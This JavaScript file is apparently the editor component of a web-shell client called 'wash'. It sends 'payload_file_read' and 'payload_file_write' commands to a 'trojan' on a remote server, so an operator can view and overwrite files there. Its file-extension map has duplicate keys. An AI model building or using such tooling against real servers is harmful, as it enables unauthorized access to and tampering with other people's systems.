shell.editor = {

    edit_file: '',

    // map file extensions to editor modes
    modes: {
        cpp      : 'cpp',
        cpp      : 'c_cpp',
        cpp      : 'coffee',
        cf       : 'coldfusion',
        cs       : 'csharp',
        css      : 'css',
        diff     : 'diff',
        haml     : 'haml',
        html     : 'html',
        java     : 'java',
        js       : 'javascript',
        json     : 'json',
        jsp      : 'jsp',
        jsx      : 'jsx',
        latex    : 'latex',
        less     : 'less',
        lisp     : 'lisp',
        lua      : 'lua',
        md       : 'markdown',
        markdown : 'markdown',
        pl       : 'perl',
        php      : 'php',
        php4     : 'php',
        php5     : 'php',
        py       : 'python',
        rhtml    : 'rhtml',
        rb       : 'ruby',
        sh       : 'sh',
        sql      : 'sql',
        svg      : 'svg',
        tcl      : 'tcl',
        tex      : 'tex',
        txt      : 'text',
        txt      : 'textile',
        xml      : 'xml',
        yaml     : 'yaml',
    },

    initialize: function(){
        // initialize the editor
        editor = ace.edit('editor');
        editor.setTheme('ace/theme/monokai');

        // initialize some keyboard shortcuts
        editor.commands.addCommand({
            name: 'save',
            bindKey: {win: 'Ctrl-S',  mac: 'Command-S'},
            exec: function(editor) {
                shell.editor.save();
            }
        });
        editor.commands.addCommand({
            name: 'quit',
            bindKey: {win: 'Ctrl-Q',  mac: 'Command-Q'},
            exec: function(editor) {
                shell.editor.quit();
            }
        });
        editor.commands.addCommand({
            name: 'mode',
            bindKey: {win: 'Ctrl-M',  mac: 'Command-M'},
            exec: function(editor) {
                shell.editor.mode();
            }
        });
    },

    // edits a file on the server
    edit: function(args){
        // clear the editor
        editor.setValue('');

        // buffer the name of the file being read
        // @bug: the write functionality will break if you cd around
        // while the file is being edited

        // shell.editor.edit_file = args.file;

        // read the contents of the file
        wash.command.action = 'payload_file_read';
        wash.command.args   = args;
        wash.net.get(function(response){
            // unpack the response object from the trojan
            json                = JSON.parse(response);
            shell.editor.edit_file = json.output.file;
            console.log(shell.editor.edit_file);

            // then load the file contents into the editor
            editor.setValue(json.output.output);
            shell.editor.show();
        });
    }, 

    // puts focus on the editor
    focus: function(){
        shell.elements.editor.focus();
    },

    // hides the editor
    hide: function(){
        shell.elements.editor.fadeOut('fast', function(){
            shell.elements.terminal.fadeIn('slow');
            shell.draw();
            shell.prompt.focus();
        });
    },

    // toggles between the editor and shell views
    mode: function(){
        if(shell.elements.editor.is(':visible')){
           shell.editor.hide(); 
        } else {
           shell.editor.show(); 
        }
    },

    // quites the editor
    quit: function(){
        // @todo: implement "unsaved changes" functionality here
        editor.setValue('');
        shell.editor.hide();
        shell.status.set('Editor closed.');
    },

    // saves the editor changes
    save: function(){
        wash.command.action = 'payload_file_write';
        wash.command.args   = {file: shell.editor.edit_file, data: editor.getValue()};
        wash.net.send(function(){
            // display a notice in the status bar
            if(wash.response.error != null){
                shell.status.set(wash.response.error);
            }
            else { shell.status.set(wash.response.output); }
        });
    },

    // shows the editor
    show: function(){
        shell.elements.terminal.fadeOut('fast', function(){
            // reveal the editor
            shell.elements.editor.fadeIn('slow');

            // enable syntax highlighting based off file extension
            var extension = wash.file.get_extension(shell.editor.edit_file);
            if(shell.editor.modes[extension] != null){
                editor.getSession().setMode('ace/mode/' + shell.editor.modes[extension]);
            } 
        
            // give focus to the editor
            shell.draw();
            shell.prompt.focus();

            // show the user the editor commands
            var help = 'Editor activated. Commands: ';
            help += 'Save: Ctrl+S | ';
            help += 'Quit: Ctrl+Q | ';
            help += 'Change Mode: Ctrl+M ';
            shell.status.set(help);
        });
    },
}
